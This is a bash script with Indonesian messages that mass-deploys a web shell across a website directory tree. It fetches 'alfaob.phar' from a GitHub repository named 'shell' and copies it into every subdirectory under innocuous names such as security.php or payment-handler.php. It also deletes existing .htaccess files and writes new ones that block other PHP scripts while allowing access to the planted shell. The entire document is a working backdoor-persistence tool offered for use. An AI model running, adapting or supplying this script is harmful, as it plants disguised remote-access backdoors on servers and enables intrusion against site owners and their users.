#!/bin/bash

if [ -z "$1" ]; then
    echo "Penggunaan: bash ht.sh /path/to/directory"
    exit 1
fi

TARGET_DIR="$1"
PHP_URL="https://raw.githubusercontent.com/paylar/shell/main/alfaob.phar"

PHP_FILES=(
  "autoload.php" "constants.php" "settings.php" "middleware.php" "dispatcher.php" 
  "response.php" "request.php" "router-config.php" "bootstrap.php" "model.php" 
  "view.php" "template.php" "cache.php" "logger.php" "error-handler.php" 
  "validator.php" "security.php" "firewall.php" "backup.php" "db-migrate.php" 
  "migration.php" "seed.php" "database-seeder.php" "queue-worker.php" "mail-handler.php" 
  "notification.php" "message-broker.php" "event-listener.php" "event-dispatcher.php" "command-runner.php" 
  "worker.php" "job-handler.php" "scheduler.php" "task-runner.php" "queue.php" 
  "file-uploader.php" "image-processor.php" "image-resizer.php" "pdf-generator.php" "report-generator.php" 
  "payment-handler.php" "checkout.php" "cart-manager.php" "order-manager.php" "invoice.php" 
  "customer-service.php" "support.php" "ticket-system.php" "user-profile1.php" "account-settings.php"
)

if ! command -v curl &>/dev/null; then
    echo "curl tidak ditemukan, silakan install curl terlebih dahulu."
    exit 1
fi

find "$TARGET_DIR" -type f -name ".htaccess" -exec rm -f {} +

TMP_PHAR=$(mktemp)
curl -s -o "$TMP_PHAR" "$PHP_URL" || {
    echo "Gagal mendownload file alfaob.phar dari $PHP_URL"
    exit 1
}

generate_htaccess() {
    SELECTED_PHP_FILE=$(shuf -n 1 -e "${PHP_FILES[@]}")
    DIR="$1"

    cp "$TMP_PHAR" "$DIR/$SELECTED_PHP_FILE" || {
        echo "Gagal menyalin $SELECTED_PHP_FILE ke $DIR"
        return
    }

    chmod 644 "$DIR/$SELECTED_PHP_FILE"

    cat <<EOF > "$DIR/.htaccess"
<FilesMatch "\\.(ph.*|a.*|P[hH].*|S.*)$">
    Require all denied
</FilesMatch>

<FilesMatch "\\.(jpg|jpeg|pdf|docx)$">
    Require all granted
</FilesMatch>

<FilesMatch "^(index\\.html|index-MAR\\.php|${SELECTED_PHP_FILE})$">
    Require all granted
</FilesMatch>

DirectoryIndex index.html
Options -Indexes

ErrorDocument 403 "403 Forbidden"
ErrorDocument 404 "404 Not Found"
EOF

}

export -f generate_htaccess
export TMP_PHAR
export PHP_FILES

find "$TARGET_DIR" -type d -print0 | xargs -0 -P 5 -I {} bash -c 'generate_htaccess "$@"' _ {}

rm -f "$TMP_PHAR"
